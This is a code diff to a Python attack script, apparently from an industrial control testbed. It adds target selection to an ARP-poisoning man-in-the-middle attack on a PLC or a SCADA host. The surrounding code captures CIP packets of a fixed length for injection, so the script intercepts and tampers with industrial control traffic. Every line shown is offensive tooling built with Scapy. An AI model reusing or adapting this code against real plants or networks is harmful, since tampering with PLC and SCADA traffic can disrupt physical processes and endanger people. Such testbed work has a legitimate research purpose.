@@ -42,7 +42,6 @@ def injection(raw):
 
 def capture(packet):
     global injection_phase
-
     pkt = IP(packet.get_payload())
     if len(pkt) == 102:
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
@@ -117,8 +116,16 @@ def __setdown(port):
 def launch_arp_poison():
     print("[*] launching arp poison")
 
-    targetip = "192.168.1.20"
-    sourceip = "192.168.1.10"
+    if sys.argv[1] == 'plc2':
+        # PLC2 MiTm attack
+        targetip = "192.168.1.20"
+        sourceip = "192.168.1.10"
+    elif sys.argv[1] == 'scada':
+        # SCADA Mitm attack
+        targetip = "192.168.2.30"
+        sourceip = "192.168.2.254"
+    else:
+        print('Invalid target, failed')
 
     arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
     targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
